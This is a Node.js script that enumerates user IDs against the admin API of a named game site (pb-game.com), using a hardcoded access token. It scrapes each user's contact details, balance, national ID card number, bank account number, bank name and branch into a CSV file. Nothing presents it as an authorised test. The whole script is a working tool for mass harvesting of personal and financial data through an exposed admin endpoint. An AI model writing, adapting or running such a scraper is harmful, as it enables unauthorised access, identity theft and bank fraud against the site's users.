const json2csv = require('json2csv').parse;
const request = require('request');
const syncRequest = require('request-promise')
const fs = require('fs');
const querystring = require('query-string');

// Const data
const token = 'EDC5F8F18073C65EF2CF60F274782DC9';
const start_from_id = 20;
const stop_on_id = 25;
const estimated_max_user_id = 1280;

const data = [];

const userInfoEndpoint = 'https://www.pb-game.com/admin.php/Home/Member/getUserInfo?token=' + token + '&uid=';
const userProfileInfoEndpoint = 'https://www.pb-game.com/admin.php/Home/User/getUserProfileInfo';

const fetch = async () => {
    let lastUid = 0;
    for(let uid = start_from_id; ((lastUid !== undefined || uid < estimated_max_user_id) && uid < stop_on_id); uid++) {
        let row = {};

        // First API endpoint
        const finalUrl = userInfoEndpoint + uid;
        try {
            const body = await syncRequest({ url: finalUrl, json: true });
            lastUid = body.data.uid;
            row = {
                uid: body.data.uid,
                nickname: body.data.nickname,
                accounts: body.data.accounts,
                portrait: body.data.portrait,
                balance: body.data.balance,
                tel_email: body.data.tel_email,
                money: body.data.money,
                zcz: body.data.zcz,
                ztx: body.data.ztx
            };
        } catch(e) {
            console.log(e);
        }

        // Second API endpoint
        const form = {
            uid,
            token
        };
        const formData = querystring.stringify(form);
        const contentLength = formData.length;

        try {
            const body = await syncRequest({
                method: 'POST',
                headers: {
                    'Content-Length': contentLength,
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                uri: userProfileInfoEndpoint,
                body: formData,
                json: true
            });
            row.id_card = body.data.id_card;
            row.banknumber = body.data.banknumber;
            row.bankname = body.data.bankname;
            row.busername = body.data.busername;
            row.branch = body.data.branch;
        } catch(e) {
            console.log(e);
        }

        data.push(row);
    }
}

fetch().then(() => {
    const csv = json2csv(data, { fields: [
        'uid', 'nickname', 'accounts', 'portrait', 'balance', 'tel_email', 'money', 'zcz', 
        'ztx', 'id_card', 'banknumber', 'bankname', 'busername', 'branch'
    ]});
    fs.writeFileSync('../files/users-data.csv', csv);
});